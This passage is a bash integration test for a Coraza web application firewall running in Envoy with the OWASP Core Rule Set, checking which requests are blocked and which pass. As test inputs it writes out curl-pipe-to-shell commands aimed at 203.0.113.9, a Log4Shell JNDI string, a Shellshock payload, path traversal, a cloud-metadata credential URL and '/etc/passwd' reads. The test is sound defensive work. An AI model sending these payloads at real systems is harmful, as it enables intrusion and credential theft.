    # wrapped at 76 columns, as GNU base64, Python's encodebytes and Java's MIME encoder write them (the rule once read each
    # line of such a value).
    for case in one:0 one:2 one:3 wrap:3 wrap:5 wrap:14; do
        python3 - "${case%%:*}" "${case#*:}" >"$temp_dir/crs-upload" <<'PY'
import base64
import json
import random
import sys

kind, seed = sys.argv[1], int(sys.argv[2])
raw = random.Random(seed).randbytes(16384 if kind == "wrap" else 65536)
content = base64.b64encode(raw).decode()
if kind == "wrap":
    content = "\n".join(content[i:i + 76] for i in range(0, len(content), 76))
sys.stdout.write(json.dumps({"name": "photo.jpg", "content": content}, separators=(",", ":")))
PY
        status=$(request "$temp_dir/response" --header 'Host: crs.local' --header 'Content-Type: application/json' \
            --data-binary "@$temp_dir/crs-upload" http://127.0.0.1:10001/crs-upload)
        check_status 200 "$status" "embedded CRS with the hardening supplement passes a base64 file of seed $case in JSON"
    done

    # Headers a backend feeds to a file system or a fetcher are read by the rules that the page-URL exclusion takes from
    # the page-URL headers: the exclusion lists names, so X-File-Path and X-Webhook-Url block.
    for case in 'X-File-Path|/etc/passwd' 'X-Webhook-Url|http://169.254.169.254/latest/meta-data/iam/security-credentials/'; do
        header=${case%%|*}
        path=/crs-sink-${header,,}
        before=$(backend_count "$path")
        status=$(request "$temp_dir/response" --header 'Host: crs.local' --header "$header: ${case#*|}" "http://127.0.0.1:10001$path")
        check_status 403 "$status" "embedded CRS with the hardening supplement blocks a payload in $header"
        require_rule_log "$path" 949110
        [[ $(backend_count "$path") == "$before" ]] || fail "a payload in $header reached the backend"
    done

    # Header classes that real clients send: an IPv6 client in RFC 7239 Forwarded (HAProxy), the OData Prefer header, and
    # Fastly's copy of Accept-Encoding.
    status=$(request "$temp_dir/response" --header 'Host: crs.local' --header 'Forwarded: for="[2001:db8:cafe::17]";proto=https' \
        --header 'Prefer: odata.include-annotations="*"' --header 'Fastly-Orig-Accept-Encoding: gzip, deflate, br' \
        http://127.0.0.1:10001/crs-header-classes)
    check_status 200 "$status" 'embedded CRS with the hardening supplement passes Forwarded with an IPv6 client, OData Prefer and a copy of Accept-Encoding'

    # A JSON key or form field named __type is a type hint (Parse Server, ASP.NET AJAX, WCF), not a GraphQL query; the query
    # field is still read, and a form login with a generated password that holds `$@` passes.
    printf '{"title":"Hello","author":{"__type":"Pointer","className":"_User","objectId":"8TOXdXf3tz"}}' >"$temp_dir/crs-parse"
    status=$(request "$temp_dir/response" --header 'Host: crs.local' --header 'Content-Type: application/json' \
        --data-binary "@$temp_dir/crs-parse" http://127.0.0.1:10001/crs-parse)
    check_status 200 "$status" 'embedded CRS with the hardening supplement passes a JSON key named __type'
    status=$(request "$temp_dir/response" --header 'Host: crs.local' --data-urlencode '__type=Order' --data-urlencode 'id=5' \
        http://127.0.0.1:10001/crs-form-type)
    check_status 200 "$status" 'embedded CRS with the hardening supplement passes a form field named __type'
    printf '{"query":"{__schema{types{name}}}"}' >"$temp_dir/crs-graphql"
    before=$(backend_count /crs-graphql)
    status=$(request "$temp_dir/response" --header 'Host: crs.local' --header 'Content-Type: application/json' \
        --data-binary "@$temp_dir/crs-graphql" http://127.0.0.1:10001/crs-graphql)
    check_status 403 "$status" 'embedded CRS with the hardening supplement denies GraphQL introspection'
    require_rule_log /crs-graphql 10934900
    [[ $(backend_count /crs-graphql) == "$before" ]] || fail 'a GraphQL introspection query reached the backend'
    # shellcheck disable=SC2016
    status=$(request "$temp_dir/response" --header 'Host: crs.local' --data-urlencode 'username=alice' \
        --data-urlencode 'password=gbEb$@9NyFCfvt0d' http://127.0.0.1:10001/crs-login)
    check_status 200 "$status" 'embedded CRS with the hardening supplement passes a generated password that holds $@'

    # Clients that pin an old release: the GREASE brand of Chromium 85 to 93 holds a semicolon and a quote (rules 942100 and
    # 942540 read sec-ch-ua if they read every header), and Composer sends `cURL 8.5.0` (rule 932235).
    status=$(request "$temp_dir/response" --header 'Host: crs.local' \
        --header 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"' \
        --header 'sec-ch-ua-mobile: ?0' http://127.0.0.1:10001/crs-old-chromium)
    check_status 200 "$status" 'embedded CRS with the hardening supplement passes the sec-ch-ua of an old Chromium'
    status=$(request "$temp_dir/response" --header 'Host: crs.local' \
        --user-agent 'Composer/2.8.2 (Linux; 6.8.0-49-generic; PHP 8.3.13; cURL 8.5.0)' http://127.0.0.1:10001/crs-composer)
    check_status 200 "$status" 'embedded CRS with the hardening supplement passes the User-Agent of Composer'
    # The supplement reads every other User-Agent for rule 932235 (rule 10932235): a command in it scores, bare or behind
    # Composer's shape. The CRS alone passes both.
    for agent in ';curl 203.0.113.9/s|sh' 'Composer/2.8.2 (Linux; 6.8.0; PHP 8.3.13; cURL 8.5.0); curl 203.0.113.9|sh'; do
        before=$(backend_count /crs-ua-command)
        status=$(request "$temp_dir/response" --header 'Host: crs.local' --user-agent "$agent" http://127.0.0.1:10001/crs-ua-command)
        check_status 403 "$status" "embedded CRS with the hardening supplement blocks a command in the User-Agent: $agent"
        require_rule_log /crs-ua-command 949110
        [[ $(backend_count /crs-ua-command) == "$before" ]] || fail 'a command in the User-Agent reached the backend'
    done

    # The consent and auth cookies that hold a URL pass at paranoia level 2 (policy crs-pl2): the remote file rules of
    # level 2 (931130, 931131) match `scheme://` anywhere, and the supplement must not give them the cookies.
    for cookie in \
        'OptanonConsent=isGpcEnabled=0&version=202409.1.0&hosts=&landingPath=https%3A%2F%2Fwww.example.com%2F&groups=C0001%3A1' \
        'next-auth.callback-url=https%3A%2F%2Fapp.example.com%2Fdashboard' \
        '_orig_referrer=https%3A%2F%2Fwww.google.com%2F; _landing_page=%2Fcollections%2Fall'; do
        status=$(request "$temp_dir/response" --header 'Host: crs2.local' --header "Cookie: $cookie" \
            --user-agent 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
            http://127.0.0.1:10001/crs-cookie-url)
        check_status 200 "$status" "embedded CRS at level 2 with the hardening supplement passes the cookie ${cookie%%=*}"
    done
    # A command in a custom header still blocks at level 2 with the supplement.
    status=$(request "$temp_dir/response" --header 'Host: crs2.local' --header 'X-Custom-Data: ;cat /etc/passwd' \
        --user-agent 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
        http://127.0.0.1:10001/crs-pl2-header-payload)
    check_status 403 "$status" 'embedded CRS at level 2 with the hardening supplement blocks a command in a custom header'

    # CRS rules that already read every header (944150 Log4Shell, 932170 Shellshock, 930100 traversal) must keep
    # reading Accept-Language and Accept-Encoding, which the supplement leaves out of the rules it retargets. The same
    # requests are blocked by the CRS alone.
    # shellcheck disable=SC2016
    for case in '944150|${jndi:ldap://203.0.113.9:1389/a}' '932170|() { :; }; /bin/cat /etc/passwd' '930100|../../../../etc/passwd'; do
        rule=${case%%|*}
        value=${case#*|}
        for header in Accept-Language Accept-Encoding; do
            path=/crs-native-${header,,}-$rule
            before=$(backend_count "$path")
            status=$(request "$temp_dir/response" --header 'Host: crs.local' --header "$header: $value" \
                "http://127.0.0.1:10001$path")
            check_status 403 "$status" "embedded CRS with the hardening supplement blocks rule $rule in $header"
            require_rule_log "$path" "$rule"
            [[ $(backend_count "$path") == "$before" ]] || fail "a $rule payload in $header reached the backend"
        done
    done

    # The crs policy loads @recommended-conf first: CRS inspects the field after an
    # empty-header part, and a body the engine cannot parse is denied by 200002.
    before=$(backend_count /crs-empty-header)
    status=$(request "$temp_dir/response" --header 'Host: crs.local' \
        --header 'content-type: multipart/form-data; boundary=X' \
        --data-binary "@$temp_dir/empty-header-sqli" http://127.0.0.1:10001/crs-empty-header)
    check_status 403 "$status" 'embedded CRS SQLi after an empty-header multipart part'
    require_rule_log /crs-empty-header 949110
    [[ $(backend_count /crs-empty-header) == "$before" ]] \
        || fail 'embedded CRS sent the field after an empty-header part to the backend'

    before=$(backend_count /crs-unterminated)
    status=$(request "$temp_dir/response" --header 'Host: crs.local' \
        --header 'content-type: multipart/form-data; boundary=X' \
        --data-binary "@$temp_dir/unterminated-multipart" http://127.0.0.1:10001/crs-unterminated)
    check_status 400 "$status" 'embedded CRS policy denies an unparseable multipart body'
    require_rule_log /crs-unterminated 200002
    [[ $(backend_count /crs-unterminated) == "$before" ]] \
        || fail 'embedded CRS policy sent an unparseable multipart body to the backend'

    # At paranoia level 2, CRS rule 950100 scores a 500 and rule 959100 denies in phase 4, which runs at the
    # response headers of a HEAD response.
    check_refused_response 403 'CRS phase-4 denial of a HEAD response' --head --header 'Host: crs2.local' \
        http://127.0.0.1:10001/status/500
fi

# A field-only multipart body must not need a temporary upload directory. This used
# to abort the WASI plugin in std::env::temp_dir() before the part was published.
printf '%b' '--X\r\nContent-Disposition: form-data; name="name"\r\n\r\nAlice\r\n--X--\r\n' \
    >"$temp_dir/multipart-field"
# The default policy's 32-byte ProcessPartial limit would cut this body, and a cut multipart body is refused
# where uploads are not accepted (below), so it goes to the policy that has a limit it fits in.
status=$(request "$temp_dir/response" --header 'Host: recommended.local' \
    --header 'content-type: multipart/form-data; boundary=X' \
    --data-binary "@$temp_dir/multipart-field" 'http://127.0.0.1:10001/greet?name=test')
check_status 200 "$status" 'field-only multipart'
if envoy_logs | grep --quiet --fixed-strings 'not supported by WASI yet'; then
    fail 'field-only multipart aborted in the WASI temporary-directory path'
fi

# A multipart body that ProcessPartial cut before its closing delimiter could hide a file in the bytes that were
# discarded, and this host does not accept uploads: it is refused, whatever the prefix shows.
status=$(request "$temp_dir/response" \
    --header 'content-type: multipart/form-data; boundary=X' \
    --data-binary "@$temp_dir/multipart-field" 'http://127.0.0.1:10001/greet?name=test')
check_status 413 "$status" 'multipart body cut by the body limit'

# Every build embeds @recommended-conf, which the recommended.local policy loads
# before its own SQLi rule.
before=$(backend_count /recommended-empty-header)
status=$(request "$temp_dir/response" --header 'Host: recommended.local' \
    --header 'content-type: multipart/form-data; boundary=X' \
    --data-binary "@$temp_dir/empty-header-sqli" http://127.0.0.1:10001/recommended-empty-header)
check_status 403 "$status" 'SQLi after an empty-header multipart part'
require_rule_log /recommended-empty-header 110
[[ $(backend_count /recommended-empty-header) == "$before" ]] \
    || fail 'the field after an empty-header multipart part reached the backend'

before=$(backend_count /recommended-unterminated)
status=$(request "$temp_dir/response" --header 'Host: recommended.local' \
    --header 'content-type: multipart/form-data; boundary=X' \
    --data-binary "@$temp_dir/unterminated-multipart" http://127.0.0.1:10001/recommended-unterminated)
check_status 400 "$status" 'recommended baseline denies an unparseable multipart body'
require_rule_log /recommended-unterminated 200002
[[ $(backend_count /recommended-unterminated) == "$before" ]] \
    || fail 'an unparseable multipart body reached the backend'

status=$(request "$temp_dir/response" --header 'Host: recommended.local' \
    --header 'content-type: multipart/form-data; boundary=X' \
    --data-binary "@$temp_dir/multipart-field" http://127.0.0.1:10001/recommended-benign)
check_status 200 "$status" 'recommended baseline passes a well-formed multipart body'

# The host has no filesystem, so the engine refuses a file part with 413. A Go backend reads `multİpart/form-data`
# (U+0130) as multipart too, so the ban must see it; recommended.local's limit does not cut this body.
printf '%b' '--X\r\nContent-Disposition: form-data; name="f"; filename="a.txt"\r\n\r\nhello\r\n--X--\r\n' \
    >"$temp_dir/multipart-file"
for content_type in 'multipart/form-data' $'mult\xc4\xb0part/form-data'; do
    before=$(backend_count /recommended-upload)
    status=$(request "$temp_dir/response" --header 'Host: recommended.local' \
        --header "content-type: $content_type; boundary=X" \
        --data-binary "@$temp_dir/multipart-file" http://127.0.0.1:10001/recommended-upload)
    check_status 413 "$status" "upload refused for content type $content_type"
    [[ $(backend_count /recommended-upload) == "$before" ]] \
        || fail "an upload with content type $content_type reached the backend"
done

# More than `SecArgumentsLimit` (1000) cookies, which pass up to 1000. The default policy has no baseline, so the filter
# refuses with 413; recommended.local's rule 200004 answers 400 first.
cookie_header() {
    printf 'Cookie:'
    printf ' c%d=v;' $(seq "${2:-1}" "$1")
}
check_cookie_limit() {
    local host=$1 path=$2 expected=$3 before
    before=$(backend_count "$path")
    status=$(request "$temp_dir/response" --header "Host: $host" --header "$(cookie_header 1000)" \
        "http://127.0.0.1:10001$path")
    check_status 200 "$status" "1000 cookies for $host"
    status=$(request "$temp_dir/response" --header "Host: $host" --header "$(cookie_header 1001)" \
        "http://127.0.0.1:10001$path")
    check_status "$expected" "$status" "1001 cookies for $host"
    [[ $(backend_count "$path") == $((before + 1)) ]] || fail "1001 cookies reached the backend for $host"
}
check_cookie_limit 127.0.0.1:10001 /cookie-limit-default 413
check_cookie_limit recommended.local /cookie-limit-recommended 400
require_rule_log /cookie-limit-recommended 200004
# The limit counts cookies across `Cookie` headers: 500 + 500 pass, 500 + 501 do not.
before=$(backend_count /cookie-limit-two-headers)
for last in 1000 1001; do
    status=$(request "$temp_dir/response" --header 'Host: 127.0.0.1:10001' \
        --header "$(cookie_header 500)" --header "$(cookie_header "$last" 501)" \
        http://127.0.0.1:10001/cookie-limit-two-headers)
    check_status "$((last == 1000 ? 200 : 413))" "$status" "cookies up to c$last in two headers"
done
[[ $(backend_count /cookie-limit-two-headers) == $((before + 1)) ]] \
    || fail "1001 cookies in two headers reached the backend"

# Envoy's own reply to a request the filter holds, here the 408 of its 60 s timeout, reaches the client, and the rest
# of the request body, which rule 102 would deny, never reaches the backend. This case takes about a minute.
before=$(backend_count /phase2-deny)
read -r status waited < <(held_request_until_timeout http://127.0.0.1:10001/phase2-deny) || true
check_status 408 "${status:-none}" 'timeout of a held request'
(( waited <= 70 )) || fail "the timeout of a held request reached the client after ${waited}s"
sleep 1
[[ $(backend_count /phase2-deny) == "$before" ]] || fail 'a held request reached the backend after its timeout'

envoy_logs >"$temp_dir/envoy.log"
grep --quiet --fixed-strings 'test blocked' "$temp_dir/envoy.log" \
    || fail 'RelevantOnly audit output did not reach the bounded Proxy-Wasm log sink'

printf 'Envoy 1.40 Coraza connector lifecycle checks passed\n'
